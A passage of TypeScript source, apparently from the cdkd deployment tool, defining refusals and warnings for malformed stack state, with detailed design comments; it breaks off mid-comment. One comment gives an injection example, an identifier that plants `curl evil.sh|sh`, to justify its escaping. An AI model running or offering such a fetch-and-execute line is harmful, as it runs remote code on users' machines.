 * and CREATES the whole stack a second time, and the next `cdkd destroy`
 * deletes nothing and orphans every live resource — and the one-shot warning
 * that would have said so is long gone, quite possibly for a different
 * operator. `cdkd import --force` launders it the same way.
 *
 * Refusing still satisfies #3018, whose complaint was the BARE `TypeError`:
 * this names the stack, the region, the defect and the remedy, and exits on a
 * code rather than on a stack trace.
 */
export function refuseMalformedState(state: StackState, stackName: string, region: string): void {
  if (hasReadableResources(state)) return;
  // NOT `markNonRetryable`, and that is the DECISION rather than the omission
  // it reads as: this is the only refusal in the module without the marker,
  // because its callers — `cdkd import`, `cdkd orphan`, `cdkd rollback` — each
  // raise it from the command's own top level, outside any `withRetry`. The
  // marker would fence nothing there. Revisit if a retrying caller is added;
  // `tests/unit/state/malformed-resources-bag.test.ts` names this exemption so
  // a seventh refusal cannot join it silently (review round 2 of
  // go-to-k/cdkd#3332).
  throw new CdkdError(malformedStateRefusalMessage(stackName, region), STATE_RESOURCES_MALFORMED);
}

/**
 * The `outputs` half of {@link malformedStateRefusalMessage}, for the same
 * reason that one is exported separately from the throw: `cdkd scrub`'s exit
 * `1` is spoken for and it raises its own exit-2 class around this text.
 *
 * A DIFFERENT text from the `resources` refusal because the consequence of
 * continuing differs, the same way the three warnings in this module differ. The
 * `resources` message forbids `cdkd deploy` / `cdkd destroy` because an
 * unreadable resource MAP is indistinguishable from an empty stack; the resource
 * set is intact here. What is at stake instead is the SHARED exports index:
 * `cdkd/_index/<region>/exports.json` is rebuilt from these bags, and a string
 * bag published one fabricated export per character into the namespace every
 * other stack's `Fn::ImportValue` binds against.
 *
 * Identifiers are sanitized and THEN shell-quoted and the command is emitted
 * LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s note gives.
 */
export function malformedOutputsRefusalMessage(stackName: string, region: string): string {
  const stack = safeIdentifier(stackName);
  const reg = safeIdentifier(region);
  return (
    `State for ${shellQuote(stack)} (${shellQuote(reg)}) has no readable 'outputs' map — the ` +
    `record is malformed or truncated. This command can WRITE state, so it refuses rather than ` +
    `continuing: it REBUILDS the bag before saving, and 'Object.entries' walks a string or a ` +
    `list as readily as a map, so a six-character value would be saved back as a well-formed ` +
    `six-key map (a null one as an empty map). That replaces the only signal anything is wrong ` +
    `with a legitimate-looking record, permanently — and the next deploy republishes it into ` +
    `the shared exports index every other stack's Fn::ImportValue resolves against. Repair or ` +
    `remove the record first. Inspect it with: cdkd state show ${shellQuote(stack)} ` +
    `--stack-region ${shellQuote(reg)} --json`
  );
}

/**
 * The line `ExportIndexStore`'s rebuild emits for a producer record whose
 * export set it could not read (issue go-to-k/cdkd#3192) — `outputs` not a
 * plain object, or `exportNames` present and not an array.
 *
 * A THIRD outputs text rather than {@link malformedOutputsWarning} because the
 * consequence is again different, which is the rule the two above already
 * follow. That one describes a DIFF continuing with an empty left-hand side.
 * This describes a record CONTRIBUTING NOTHING to a shared, region-wide index
 * other stacks resolve against — so the symptom a reader will actually meet is
 * a later `Fn::ImportValue` failing in a DIFFERENT stack, naming the consumer
 * and not this record. Saying which producer dropped out is the whole value of
 * the line.
 *
 * It says the rebuild CONTINUES, because it does: refusing would take every
 * other producer in the region down with it, and the index is best-effort by
 * design.
 *
 * Identifiers are sanitized and THEN shell-quoted and the command is emitted
 * LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s note gives.
 */
export function malformedExportSourceWarning(stackName: string, region: string): string {
  const stack = safeIdentifier(stackName);
  const reg = safeIdentifier(region);
  return (
    `State for ${shellQuote(stack)} (${shellQuote(reg)}) has no readable 'outputs' map or ` +
    `'exportNames' list — the record is malformed or truncated. It contributes NO exports to ` +
    `this region's index, which is not the same as the stack exporting none: an ` +
    `Fn::ImportValue of a name this stack really publishes will fail in the CONSUMER stack, ` +
    `naming that stack rather than this record. Continuing with the other producers — ` +
    `enumerating a string or a list here would instead publish one FABRICATED export per ` +
    `character or element. See the stored values with: cdkd state show ${shellQuote(stack)} ` +
    `--stack-region ${shellQuote(reg)} --json`
  );
}

/**
 * The line a READ-ONLY command emits when a record's `exportNames` FIELD could
 * not be used (go-to-k/cdkd#3192 review) — present and not an array, or an
 * array with no usable name in it.
 *
 * Why a message at all, when the predicate already fails closed: before this
 * class was guarded, `cdkd diff` over such a record died with
 * `TypeError: state.exportNames.filter is not a function`. Failing closed
 * inside `importableOutputKeys` is right — it is a pure predicate reached from
 * five commands and holds no stack identity — but silently replacing a LOUD
 * wrong answer with a QUIET one is its own regression, and `cdkd diff` is
 * exactly the caller that DOES hold the identity. Without this it warned about
 * a damaged `outputs` bag on one line and said nothing about the damaged
 * `exportNames` on the same record.
 *
 * Deliberately NOT {@link malformedOutputsWarning}'s text: that one is about
 * the BAG, and the consequence differs. An unusable export SET does not lose
 * the comparison's left-hand side — every stored key is still diffed — it
 * makes the preview report no key as an export, so a row that would carry
 * `[export]` renders without it.
 *
 * Identifiers are sanitized and THEN shell-quoted and the command is emitted
 * LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s note gives.
 */
export function malformedExportNamesWarning(stackName: string, region: string): string {
  const stack = safeIdentifier(stackName);
  const reg = safeIdentifier(region);
  return (
    `State for ${shellQuote(stack)} (${shellQuote(reg)}) has an unusable 'exportNames' list — ` +
    `the record is malformed or truncated. It is read as an EMPTY export set, which is not the ` +
    `same as the record holding one: no stored key is reported as an export, so a row that ` +
    `should carry an '[export]' tag renders without it. Reading it as UNKNOWN instead would be ` +
    `worse — that falls back to the pre-v9 rule where every output name is importable. See the ` +
    `stored value with: cdkd state show ${shellQuote(stack)} --stack-region ${shellQuote(reg)} ` +
    `--json`
  );
}

/**
 * For a command that can WRITE state: refuse a record whose `outputs` bag
 * cannot be read, instead of rebuilding it (issue go-to-k/cdkd#3192).
 *
 * The SIBLING of {@link refuseMalformedState}, and deliberately a second call
 * rather than a widening of that one. A record can be malformed in either
 * container alone, the two carry different consequences, and the refusal a user
 * sees must name the container that is actually broken — a `resources` message
 * printed over an intact resource map tells them not to run `cdkd deploy` for a
 * reason that does not hold.
 *
 * Why REFUSE and not {@link repairMalformedOutputsForReadOnly}, which is the
 * opposite answer for the same container one function up: repairing the bag and
 * then saving it IS the laundering this is here to stop. Measured, not
 * reasoned — `rewriteResourceReferences` turns `outputs: 'abcdef'` into
 * `{"0":"a",…,"5":"f"}` and `cdkd orphan` saves that; `cdkd scrub`'s
 * `redactUnaccountedOutputs` spreads the same string into a map and its
 * `outputsChanged` compare then satisfies the `recordsChanged > 0` write gate;
 * `cdkd import` carries a `null` bag through `?? {}`. Each one rewrites a
 * damaged record into a well-formed one and the evidence is gone.
 *
 * CALL IT AT THE LOAD, beside {@link refuseMalformedState} and above the first
 * expression that reads the bag — the placement rule
 * {@link repairMalformedResourcesForReadOnly}'s note records, for the reason it
 * records: a guard written at the rebuild leaves every earlier dereference in
 * front of it.
 */
export function refuseMalformedOutputs(
  state: Pick<StackState, 'outputs'>,
  stackName: string,
  region: string
): void {
  if (hasReadableOutputs(state)) return;
  // `markNonRetryable` for the reason its three siblings carry it, which holds
  // here identically and was simply missed: `cdkd deploy` is one of this
  // function's callers, a nested child's deploy runs inside the parent's
  // `withRetry(provider.create)`, the verdict comes from a PERSISTED record no
  // retry can change, and the message interpolates a caller-supplied stack name
  // a SUBSTRING-matching classifier can read as transient. Without it a child
  // whose `outputs` bag was damaged burned the full retry schedule while one
  // whose `resources` bag was damaged did not (review of go-to-k/cdkd#3161).
  // Issue #1838.
  throw markNonRetryable(
    new CdkdError(malformedOutputsRefusalMessage(stackName, region), STATE_RESOURCES_MALFORMED)
  );
}

/**
 * The DESTROY refusal text (issue
 * [#3207](https://github.com/go-to-k/cdkd/issues/3207)).
 *
 * A FOURTH outputs text rather than {@link malformedOutputsRefusalMessage},
 * for the reason every text in this module is its own: that one says the
 * command "REBUILDS the bag before saving", which is FALSE here. A destroy
 * never rebuilds the bag — its incremental preserve-writes CLEAR `outputs`
 * outright. What it does with the bag instead is DECIDE, and the decision is
 * the strong-reference pre-flight: `state.outputs && Object.keys(...).length >
 * 0` asks "might this stack be a producer?", and only a positive answer runs
 * the cross-stack scan that refuses to delete an exporter while an importer
 * exists.
 *
 * Both directions of that question are wrong on a damaged bag, which is why
 * repairing is not available here. A STRING or a LIST answers YES for the
 * wrong reason — `Object.keys('abcdef')` is six fabricated names — and a
 * `null`, a number or a boolean answers NO, so the scan is SKIPPED and the
 * destroy deletes a producer other stacks still `Fn::ImportValue` from.
 * Reading the bag as empty (the read-only repair) IS that second answer, so
 * the only answer that fabricates nothing and skips no protection is to stop.
 *
 * Identifiers are sanitized and THEN shell-quoted and the command is emitted
 * LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s note gives.
 */
export function malformedDestroyOutputsRefusalMessage(stackName: string, region: string): string {
  const stack = safeIdentifier(stackName);
  const reg = safeIdentifier(region);
  return (
    `State for ${shellQuote(stack)} (${shellQuote(reg)}) has no readable 'outputs' map — the ` +
    `record is malformed or truncated. This command DELETES state, so it refuses rather than ` +
    `continuing: it reads this bag to decide whether the stack might export anything, and that ` +
    `decision gates the cross-stack check that refuses to delete a producer another stack still ` +
    `imports from. A string or a list invents one export name per character or element; a null, ` +
    `a number or a boolean reads as 'exports nothing' and SKIPS the check entirely, deleting the ` +
    `record while consumers still resolve against it. Repair or remove the record first. ` +
    `Inspect it with: cdkd state show ${shellQuote(stack)} --stack-region ${shellQuote(reg)} --json`
  );
}

/**
 * For `cdkd destroy` / `cdkd state destroy`: refuse a record whose `outputs`
 * bag cannot be read (issue
 * [#3207](https://github.com/go-to-k/cdkd/issues/3207)).
 *
 * A SEPARATE call from {@link refuseMalformedOutputs} rather than a flag on
 * it, for the same reason {@link refuseMalformedOutputs} is separate from
 * {@link refuseMalformedState}: the refusal a user sees must describe what
 * THIS command would have done with the bag, and the two consequences are
 * different — see {@link malformedDestroyOutputsRefusalMessage}.
 *
 * CALL IT AT THE TOP OF THE DESTROY, above the strong-reference decision it
 * protects. The placement rule is
 * {@link repairMalformedResourcesForReadOnly}'s and applies unchanged.
 */
export function refuseMalformedOutputsForDestroy(
  state: Pick<StackState, 'outputs'>,
  stackName: string,
  region: string
): void {
  if (hasReadableOutputs(state)) return;
  // `markNonRetryable` because this decides from a PERSISTED record: a retry
  // cannot change the bag, and the message interpolates a template-derived
  // child name that a SUBSTRING-matching classifier reads as transient
  // (`does not exist` and `DependencyViolation` are live patterns). Issue #1838.
  throw markNonRetryable(
    new CdkdError(
      malformedDestroyOutputsRefusalMessage(stackName, region),
      STATE_RESOURCES_MALFORMED
    )
  );
}

/**
 * The NESTED-STACK refusal text (issue
 * [#3207](https://github.com/go-to-k/cdkd/issues/3207)).
 *
 * A FIFTH text, and the one whose damaged record and saved record are
 * DIFFERENT stacks. `NestedStackProvider.readChildOutputsAsAttributes` reads
 * the CHILD's persisted bag and rebuilds it into the PARENT's
 * `Outputs.<Key>` attributes; the parent's deploy then persists those
 * attributes into the parent's own record, where every `Fn::GetAtt` against
 * the nested stack resolves them — into live AWS calls. So a six-character
 * child bag becomes six fabricated parent attributes, and
 * {@link malformedOutputsRefusalMessage}'s "saved back as a well-formed
 * six-key map ... republished into the shared exports index" would name the
 * wrong record and the wrong blast radius.
 *
 * Identifiers are sanitized and THEN shell-quoted and the command is emitted
 * LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s note gives.
 */
export function malformedNestedChildOutputsRefusalMessage(
  childStackName: string,
  region: string
): string {
  const stack = safeIdentifier(childStackName);
  const reg = safeIdentifier(region);
  return (
    `State for nested stack child ${shellQuote(stack)} (${shellQuote(reg)}) has no readable ` +
    `'outputs' map — the record is malformed or truncated. The parent's 'Outputs.<Key>' ` +
    `attributes are REBUILT from this bag and persisted into the PARENT's record, and ` +
    `'Object.entries' walks a string or a list as readily as a map — so a six-character value ` +
    `would become six fabricated parent attributes that every Fn::GetAtt against this nested ` +
    `stack then resolves into live AWS calls. The deploy refuses rather than fabricating them. ` +
    `Repair or remove the child's record first. Inspect it with: cdkd state show ` +
    `${shellQuote(stack)} --stack-region ${shellQuote(reg)} --json`
  );
}

/**
 * For the nested-stack provider: refuse a CHILD record whose `outputs` bag
 * cannot be read (issue [#3207](https://github.com/go-to-k/cdkd/issues/3207)).
 *
 * The provider itself calls no `saveState`, and that is why this is a refusal
 * rather than a repair anyway: what it returns becomes the parent's
 * `ResourceState.attributes`, which the parent's deploy engine persists. Being
 * write-capable THROUGH A CALLER is the same hazard as writing directly, and
 * repairing here would put a well-formed fabricated attribute set into the
 * parent's record with nothing left to say the child was damaged.
 */
export function refuseMalformedNestedChildOutputs(
  state: Pick<StackState, 'outputs'>,
  childStackName: string,
  region: string
): void {
  if (hasReadableOutputs(state)) return;
  // `markNonRetryable` because this decides from a PERSISTED record: a retry
  // cannot change the bag, and the message interpolates a template-derived
  // child name that a SUBSTRING-matching classifier reads as transient
  // (`does not exist` and `DependencyViolation` are live patterns). Issue #1838.
  throw markNonRetryable(
    new CdkdError(
      malformedNestedChildOutputsRefusalMessage(childStackName, region),
      STATE_RESOURCES_MALFORMED
    )
  );
}

/**
 * The warning the `cdkd local *` commands emit for a record whose `outputs`
 * bag they had to read as EMPTY (issue
 * [#3207](https://github.com/go-to-k/cdkd/issues/3207)).
 *
 * A SIXTH text, and the only one on this container for a READ-ONLY caller
 * other than {@link malformedOutputsWarning}. It is not that one because the
 * consequence differs the same way every text in this module differs: that one
 * describes a DIFF continuing with an empty left-hand side and reporting every
 * resolved output as an `ADD`. A local run reports no rows at all — it
 * SUBSTITUTES, so the visible effect is an environment variable or a
 * `Fn::GetStackOutput` / `Fn::ImportValue` reference that resolves to nothing
 * and is dropped with a per-key warning, which is what "the record holds no
 * outputs" also looks like.
 *
 * TWO call sites share it, deliberately: `S3LocalStateProvider.load` reading
 * the TARGET stack's record, and `buildCrossStackResolver`'s
 * `Fn::GetStackOutput` arm reading a PRODUCER's. The record named is whichever
 * one is damaged, and the consequence is identical — which is why one text is
 * right here and a second spelling would only drift.
 *
 * Read-only is a property of these callers rather than of the command:
 * `cdkd local` writes no `state.json`. It CAN write one DERIVED key —
 * `ExportIndexStore.load` rebuilds and PUTs `cdkd/_index/<region>/exports.json`
 * on a miss — and that write is already fail-closed and warned about by
 * `hasReadableExportSet` / {@link malformedExportSourceWarning}, so nothing
 * here can launder a record.
 *
 * Identifiers are sanitized and THEN shell-quoted and the command is emitted
 * LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s note gives.
 */
export function malformedLocalOutputsWarning(stackName: string, region: string): string {
  const stack = safeIdentifier(stackName);
  const reg = safeIdentifier(region);
  return (
    `State for ${shellQuote(stack)} (${shellQuote(reg)}) has no readable 'outputs' map — the ` +
    `record is malformed or truncated. 'Object.entries' walks a string or a list as readily as ` +
    `a map, so reading it would hand this local run one FABRICATED output per character or ` +
    `element. Continuing with it EMPTY: every reference to an output of this record resolves to ` +
    `nothing and is dropped, which is not the same as the record holding none. See the stored ` +
    `value with: cdkd state show ${shellQuote(stack)} --stack-region ${shellQuote(reg)} --json`
  );
}

/** How many logical ids a `properties` message names before it says "and N more". */
const NAMED_UNREADABLE_PROPERTY_BAGS = 5;

/**
 * The `State for '<stack>' ('<region>')` opening of a `properties` message,
 * and the matching `--stack-region` flag on its remedy command.
 *
 * **BOTH are optional, and an ABSENT identity is not a degraded case — it is
 * the only honest one for a caller that holds no TRUSTED identity.**
 * `src/analyzer/diff-calculator.ts` is exactly that caller: it receives a
 * `StackState` and nothing else, and `parseStateBody` validates neither
 * `stackName` nor `region`, so the record being declared malformed would be
 * naming ITSELF. An attacker holding `s3:PutObject` on one stack's key could
 * then plant `"stackName": "prod-payments"` in a `dev` record and have the
 * refusal hand the operator a pasteable `cdkd state show 'prod-payments'
 * --stack-region '...'` — a destructive instruction aimed at a healthy record,
 * while the damaged one goes unnamed (review of go-to-k/cdkd#3191). Every
 * other refusal in this module takes the CALLER's resolved identity, and this
 * one drops the clause instead rather than inventing or borrowing one.
 *
 * `src/cli/commands/diff-recursive.ts` DOES hold a trusted pair — the
 * `stackName` / `region` its own load was keyed on — so the read-only warning
 * passes them and the asymmetry is the point rather than an oversight. A later
 * lane that threads the trusted pair into `calculateDiff` passes it here with
 * no signature change.
 *
 * A region may also be absent on a v1 record, which predates the
 * region-prefixed key layout. A placeholder would put a `--stack-region` into
 * a pasted command that selects no record at all, so it is dropped for the
 * same reason — the call go-to-k/cdkd#3226 makes for `malformedStateDetail`.
 */
function stackClause(stackName: string | undefined, region: string | undefined): string {
  if (stackName === undefined) return 'The state record this command loaded';
  const where = region === undefined ? '' : ` (${shellQuote(safeIdentifier(region))})`;
  return `State for ${shellQuote(safeIdentifier(stackName))}${where}`;
}

/** The remedy command {@link stackClause}'s message ends on. */
function inspectCommand(stackName: string | undefined, region: string | undefined): string {
  if (stackName === undefined) {
    // A TEMPLATE rather than a command, and it says so: substituting anything
    // here would be substituting the untrusted values the clause above drops.
    return 'cdkd state show <stack> --stack-region <region> --json';
  }
  const flag = region === undefined ? '' : ` --stack-region ${shellQuote(safeIdentifier(region))}`;
  return `cdkd state show ${shellQuote(safeIdentifier(stackName))}${flag} --json`;
}

/**
 * The logical ids whose resource record carries a `properties` bag that cannot
 * be read as a map (issue
 * [#3191](https://github.com/go-to-k/cdkd/issues/3191)).
 *
 * A THIRD container, on the ENTRY rather than on the record root, and it is a
 * separate predicate from {@link hasReadableResources} for the reason every
 * split in this module is: the CONSEQUENCE differs. An unreadable `resources`
 * map reads as an empty STACK; an unreadable `properties` bag reads as a
 * resource whose every declared property is MISSING, which
 * `src/analyzer/diff-calculator.ts` turns into a property-change set and, for
 * a create-only property, into a REPLACEMENT of the live resource.
 *
 * `undefined` is NOT exempt here, unlike in {@link hasReadableOutputs}. That
 * exemption exists because cdkd itself writes records with no `outputs` key —
 * `JSON.stringify` drops an `undefined` field on the deploy's failure-path
 * saves. Nothing writes a resource record with no `properties`: every writer
 * in `src/` assigns an object (`cdkd import` spells it `Properties ?? {}`),
 * `JSON.stringify` never drops a `{}`, and the field is REQUIRED by
 * `ResourceState`. An absent bag is therefore a hand edit or a truncation, and
 * it is one of the two shapes that used to die on a bare `TypeError` naming no
 * stack, no key and no remedy (`Cannot convert undefined or null to object`).
 *
 * An entry that is not a readable OBJECT is SKIPPED rather than named, so this
 * verdict is ORDER-INDEPENDENT with respect to the entry-level guard
 * go-to-k/cdkd#3226 adds: a `null` entry has no `properties` to test, and
 * reading one off a string entry would name a per-character defect that is
 * really the entry's. Likewise a `resources` bag that is not readable at all
 * yields `[]` here rather than ids invented from a string's characters — that
 * class is {@link hasReadableResources}'s to report. What a caller must not do
 * is take only this one.
 */
export function unreadableResourcePropertyBags(state: StackState): readonly string[] {
  if (!hasReadableResources(state)) return [];
  return Object.entries(state.resources)
    .filter(
      ([, entry]) =>
        isReadableBag(entry) && !isReadableBag((entry as { properties?: unknown }).properties)
    )
    .map(([logicalId]) => logicalId);
}

/**
 * For a command that can WRITE state — `cdkd deploy` — refuse the record
 * naming the resources whose `properties` bag could not be read (issue
 * [#3191](https://github.com/go-to-k/cdkd/issues/3191)).
 *
 * **REFUSE, and repairing to `{}` is not the safe alternative here — it is the
 * SAME outcome.** That is the measurement the issue asked for, and it is what
 * settles the contract rather than the write-capable rule alone. Driven
 * through the real `DiffCalculator` against an `AWS::S3::Bucket` declaring
 * `BucketName`, a stored `properties` of `"abcdef"`, `[]` and `5` each
 * produced a property change carrying `requiresReplacement: true` — and `[]`
 * and `5` enumerate no keys, so they ARE the repaired-to-empty case. A repair
 * would launder a torn record into a silent REPLACE of a live resource, which
 * is the data loss the guard exists to prevent; only a refusal closes it.
 *
 * The cost is stated rather than argued away: a deploy over ONE torn record
 * aborts the whole run, including the stacks and resources that are fine.
 * That is the right trade against replacing a resource nobody asked to
 * replace, and it is paid before anything irreversible: the refusal is raised
 * from the diff, so nothing is provisioned and no state is written for the
 * stack, and the deploy's lock is released by its own `finally`. NOT "before
 * any provider call" — that claim is false and was corrected in review:
 * `DeployEngine.kickOffAutoRefreshObservedProperties` fires fire-and-forget
 * `provider.readCurrentState` READS earlier in the same run. They persist
 * nothing, because the save they would be drained into never happens.
 *
 * The identity in the message is the CALLER's, never the record's — see
 * {@link stackClause}, where an absent identity is the honest case rather than
 * a degraded one.
 *
 * Deliberately NOT folded into {@link refuseMalformedState}, for the reason
 * {@link unreadableResourcePropertyBags} gives: that predicate answers a
 * question about the record ROOT, and its four callers (`cdkd scrub`,
 * `import`, `orphan`, `rollback`) have made no decision about this one. Three
 * of them do not compare properties at all, and `cdkd rollback` replays a
 * journal rather than diffing, so an unrelated broken bag would stop the
 * command documented as the way to UNWIND a stack whose state is already
 * suspect. This rule is OPT-IN, taken by the flow that COMPARES the bag.
 */
export function refuseMalformedResourceProperties(
  state: StackState,
  stackName: string | undefined,
  region: string | undefined
): void {
  const unreadable = unreadableResourcePropertyBags(state);
  if (unreadable.length === 0) return;
  // `markNonRetryable` for the reason `refuseMalformedNestedChildOutputs`
  // carries it: the verdict comes from a PERSISTED record, so no retry can
  // change it, while the message interpolates record-derived identifiers a
  // SUBSTRING-matching retry classifier can read as transient. Issue #1838.
  throw markNonRetryable(
    new CdkdError(
      malformedResourcePropertiesRefusalMessage(stackName, region, unreadable),
      STATE_RESOURCES_MALFORMED
    )
  );
}

/**
 * For a READ-ONLY command — `cdkd diff` — give each unreadable `properties`
 * bag an empty map so the command can report on the record, and return the ids
 * so the caller can warn.
 *
 * The read-only twin of {@link refuseMalformedResourceProperties}, and the
 * WRITE is what makes the difference, not the shape: `cdkd diff` persists
 * nothing, so it cannot launder the evidence, and previewing the remaining
 * resources beats aborting the whole preview over one torn bag.
 *
 * Repair-to-`{}` rather than a DROP of the whole entry, because an empty bag
 * IS honest for this container: the entry still names a real `resourceType`
 * and `physicalId`, so it belongs in the diff as a row.
 * Dropping it would report the resource as a CREATE, inventing a change the
 * next deploy does not make.
 *
 * What the repair does NOT do is make the preview accurate, which is why the
 * warning is not optional. The caller says so in
 * {@link malformedResourcePropertiesWarning}'s terms, which are deliberately
 * wider than "previewed as an addition": a node whose template is GONE —
 * `buildDeletedSubtree` diffs a removed nested child against an EMPTY template
 * — declares nothing, so its rows are DELETEs whose previous side is now the
 * repaired `{}` rather than what the record holds.
 *
 * Call it AFTER {@link repairMalformedResourcesForReadOnly}: an unreadable BAG
 * has no entries to walk, and the predicate deliberately returns `[]` for one.
 *
 * And call it again after anything that SPLICES further records into
 * `state.resources` — `computeStackDiff`'s rollback-orphan adoption is the one
 * such site, and its records come straight from `state.orphans[].state`, which
 * this load never walked (review of go-to-k/cdkd#3191).
 */
export function repairMalformedResourcePropertiesForReadOnly(state: StackState): readonly string[] {
  const unreadable = unreadableResourcePropertyBags(state);
  for (const logicalId of unreadable) {
    (state.resources[logicalId] as { properties: Record<string, unknown> }).properties = {};
  }
  return unreadable;
}

/**
 * The half the refusal and the warning share: what is wrong and which records.
 *
 * ONE spelling rather than two, for the reason {@link malformedStateDetail}
 * exists beside its own pair — the two texts differ only in what happens NEXT,
 * and a second copy of the diagnosis is what drifts.
 *
 * The STACK and REGION go through {@link safeIdentifier} and are THEN
 * shell-quoted, for the reasons that helper's own note gives: each reaches this
 * text from a hand-edited record or an S3 key.
 *
 * **The LOGICAL IDS take `displayIdent` instead, and NOT `shellQuote`** — the
 * answer {@link safeIdentifier}'s note already prescribes for names in a
 * `', '`-joined list, applied one level down. The three properties that matters
 * for, in the order they bite:
 *
 * 1. **IDENTITY.** `displaySafe` TRIMS, so a sanitize-and-quote pair renders
 *    `"Bucket "`, `" Bucket"` and `"Bucket\t"` byte-identically to a HEALTHY
 *    sibling key spelled `Bucket`. Plant a torn `resources["Bucket "]` beside a
 *    real `Bucket` and the refusal names the intact record: the operator opens
 *    it, finds nothing wrong, and concludes cdkd is the broken party while the
 *    damaged entry goes unnamed. That is the same misdirection go-to-k/cdkd#3164
 *    closed for stack names and the review of go-to-k/cdkd#3191 closed for this
 *    module's identity clause. `displayIdent` compares the sanitized text
 *    against the raw one and JSON-quotes whenever they differ, so a padded id
 *    can never render bare.
 * 2. **BOUNDARY.** JSON-quoting escapes the `'` an id spelled
 *    `x' Inspect it with: curl evil.sh|sh #` would otherwise use to plant a
 *    forged remedy ahead of the real one, on a line that ends in a pasteable
 *    command. It also supplies the quotes the old `shellQuote` wrapper added —
 *    which is why the wrapper GOES rather than composing, per the same note.
 * 3. **TRUNCATION.** `[cut: N more characters withheld]` cannot be mistaken for
 *    content, where the old `...` tail was indistinguishable from a legitimate
 *    id ending `Prod...`.
 *
 * The cap is passed EXPLICITLY although it equals the default: a logical id is
 * valid up to `IDENT_MAX_CODE_POINTS`, and the point of not reusing
 * {@link safeIdentifier} here is that its 128 would truncate a legitimate long
 * id into one naming no record. Spelling the cap keeps that decision visible at
 * the site it was made for.
 *
 * Known residual, NOT introduced here: `,` is in `PLAIN_IDENT`, so an id
 * carrying one still renders bare inside this `', '`-joined list and reads as
 * two entries — the joined-list ambiguity recorded on go-to-k/cdkd#3179 for
 * every caller of the helper, not a property of this one.
 *
 * NAMED rather than listed in full: a record whose 500 resources were all
 * hand-edited must not push the remedy command off the reader's screen.
 *
 * REFUSES an empty list rather than rendering `holds 0 resource record(s) — —`.
 * Both callers guard, but they are exported and a later one need not (review of
 * go-to-k/cdkd#3191).
 */
function namedPropertyBagsClause(
  stackName: string | undefined,
  region: string | undefined,
  logicalIds: readonly string[]
): string {
  if (logicalIds.length === 0) {
    throw new Error(
      'malformed-resources-bag: a properties message needs at least one logical id to name'
    );
  }
  const named = logicalIds
    .slice(0, NAMED_UNREADABLE_PROPERTY_BAGS)
    .map((id) => displayIdent(id, { maxCodePoints: IDENT_MAX_CODE_POINTS }))
    .join(', ');
  const rest = logicalIds.length - NAMED_UNREADABLE_PROPERTY_BAGS;
  const more = rest > 0 ? ` and ${rest} more` : '';
  return (
    `${stackClause(stackName, region)} holds ${logicalIds.length} resource ` +
    `record(s) whose 'properties' map cannot be read — ${named}${more} — because it is absent, ` +
    `null, or not an object. The record is malformed or truncated. Comparing a template against ` +
    `one reports every property the template declares as ADDED (a string bag also invents one ` +
    `change per character), and a create-only property among them is a REPLACEMENT of the live ` +
    `resource.`
  );
}

/**
 * The text {@link refuseMalformedResourceProperties} raises.
 *
 * `stackName` / `region` are the CALLER's resolved identity or nothing at all;
 * {@link stackClause} is the authority for why this one may be handed neither.
 *
 * **It must be true under `cdkd deploy --dry-run` as well**, and the first
 * revision was not. Provisioning is gated AFTER the diff
 * (`deploy-engine.ts`'s `if (this.options.dryRun)` return sits below
 * `calculateDiff`), so a dry run reaches this refusal and aborts — while the
 * text asserted "it would DELETE and re-create resources", which a dry run
 * would not do. A refusal that misstates what was about to happen is the same
 * defect class as one naming the wrong record (review of go-to-k/cdkd#3191).
 *
 * **A dry run REFUSES rather than repairing, and that is the decision.** The
 * repair-and-warn half of this container belongs to `cdkd diff`, and the
 * argument recorded for it in `.claude/rules/state-malformed-properties.md` —
 * "a preview of the rest of the stack beats an abort" — does not transfer,
 * because it is already SATISFIED by that sibling: a user who wants the
 * repaired preview runs `cdkd diff` and gets it, with the warning. `cdkd diff`
 * refusing would leave no way to preview at all; `cdkd deploy --dry-run`
 * refusing costs nothing that is not available one command over. Against that,
 * repairing here would need a mode threaded into `calculateDiff`, the single
 * chokepoint whose whole value is that both callers share it — and it would
 * create the worst arm of all: a plausible-looking `--dry-run` plan followed
 * by a refusal the moment the flag comes off. So the message points at
 * `cdkd diff` instead of weakening the guard.
 */
export function malformedResourcePropertiesRefusalMessage(
  stackName: string | undefined,
  region: string | undefined,
  logicalIds: readonly string[]
): string {
  return (
    `${namedPropertyBagsClause(stackName, region, logicalIds)} 'cdkd deploy' can WRITE state and ` +
    `AWS resources, so it refuses rather than continuing — under '--dry-run' too, because the ` +
    `plan a dry run would print is the wrong one: a DELETE and re-create of resources the ` +
    `template did not change, and reading the bag as empty produces that same verdict rather ` +
    `than avoiding it. Nothing was provisioned and no state was written FOR THIS STACK. Repair or ` +
    `remove the record first; 'cdkd diff' previews the rest of the stack with those maps read ` +
    `as EMPTY and warns that it did. Inspect the record with: ` +
    `${inspectCommand(stackName, region)}`
  );
}

/**
 * The `cdkd orphan` refusal text for the per-entry `properties` container
 * (issue [#3318](https://github.com/go-to-k/cdkd/issues/3318)).
 *
 * A SECOND `properties` refusal beside
 * {@link malformedResourcePropertiesRefusalMessage}, for the reason every
 * split in this module is its own: that text describes the DIFF's verdict —
 * "a DELETE and re-create of resources the template did not change" — which
 * `cdkd orphan` never computes. It runs no diff at all.
 *
 * **And the harm here is NOT the laundering the module's other write-capable
 * refusals describe.** Measured 2026-09-17 through the real
 * `rewriteResourceReferences` over an `AWS::S3::Bucket` record: `rewriteValue`
 * returns a non-object verbatim, so a stored `"abcdef"` comes back as
 * `"abcdef"`, a `5` as `5`, a `null` as `null`, and an ABSENT bag stays absent
 * once `JSON.stringify` drops it. Nothing is fabricated and no evidence is
 * replaced — so {@link malformedOutputsRefusalMessage}'s "saved back as a
 * well-formed six-key map" sentence, true one container over, would be FALSE
 * here and must not be borrowed.
 *
 * What IS at stake is the command's own job. `cdkd orphan` exists to leave the
 * record deployable: it rewrites every surviving sibling's `Ref` /
 * `Fn::GetAtt` / `Fn::Sub` reference to an orphan so the next deploy neither
 * re-creates the orphan nor fails on a stale reference. Over a map it cannot
 * read it cannot do that and cannot say it did not. A scalar bag presents no
 * reference to find, so the `--force`-less hard fail on unresolvable
 * references can never fire for one; a LIST bag is the one unreadable shape
 * `rewriteValue` DOES walk (measured: a stored `[{"Ref":"<orphan>"}]` came
 * back as `["<physicalId>"]` with one row in the audit table), so its rewrites
 * are reported into a container that is still not a map. Either way the
 * command takes a lock, saves, and reports success over a record left in
